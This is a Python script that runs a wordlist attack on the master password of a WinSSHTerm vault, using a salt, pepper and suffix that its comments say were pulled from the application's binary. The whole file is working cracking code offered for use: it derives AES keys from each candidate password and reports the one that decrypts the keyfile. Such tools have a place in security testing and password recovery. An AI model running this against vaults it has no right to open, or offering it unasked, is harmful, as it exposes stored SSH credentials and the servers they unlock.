import sys
import argparse
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

def attempt_decrypt(password, keyfile, PEPPER, SUFFIX, SALT):
    derived_key_iv = pbkdf2_hmac('sha1', PEPPER + password.encode() + SUFFIX, SALT, 1012, dklen=32 + 16)
    key = derived_key_iv[:32]
    iv = derived_key_iv[32:]

    aes = AES.new(key, AES.MODE_CBC, iv)
    decrypted_content = aes.decrypt(keyfile[1:])  # the first byte of the keyfile needs to be stripped before decryption

    if SUFFIX in decrypted_content:
        decrypted_content = decrypted_content[:-(decrypted_content[-1])]
        decrypted_content = decrypted_content[:-16] # strip SUFFIX
        return True, password, None
    return False, None, None

def main():
    parser = argparse.ArgumentParser(description="Recover the master password of a WinSSHTerm vault using a keyfile from the config directory.")
    parser.add_argument("keyfile", help="Path to the keyfile (encrypted master password)")
    parser.add_argument("wordlist_file", help="Path to the wordlist file")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")

    args = parser.parse_args()

    try:
        with open(args.keyfile, 'rb') as file:
            keyfile = file.read()
    except FileNotFoundError:
        print("Key file not found.")
        sys.exit(1)

    if args.debug:
        print(f"Keyfile contents: {keyfile}")

    try:
        with open(args.wordlist_file, "r") as file:
            wordlist = file.read().split("\n")
    except FileNotFoundError:
        print("Wordlist file not found.")
        sys.exit(1)

    # Static values from binary
    SALT = bytes([59, 218, 49, 183, 72, 5, 80, 227, 188, 102, 4, 109, 239, 201, 81, 168]) # located in WinSSHTerm.Tools.AesCrypt::A
    PEPPER = b'h7ko%.rdz.WFxsS218LK' # is prepended to the entered password > found while debugging  WinSSHTerm.Tools.AesCrypt::A 
    SUFFIX = bytes([116, 53, 55, 105, 46, 33, 103, 100, 57, 195, 182, 195, 159, 102, 116, 121]) # located in WinSSHTerm.Tools.AesCrypt::A

    for password in wordlist:
        found, found_password, decrypted_content = attempt_decrypt(password, keyfile, PEPPER, SUFFIX, SALT)
        if found:
            print(f"Master Password successfully decrypted: '{found_password}'")
            break
        elif args.debug:
            print(f"Decrypt attempt with password '{password}' failed.")

if __name__ == "__main__":
    main()
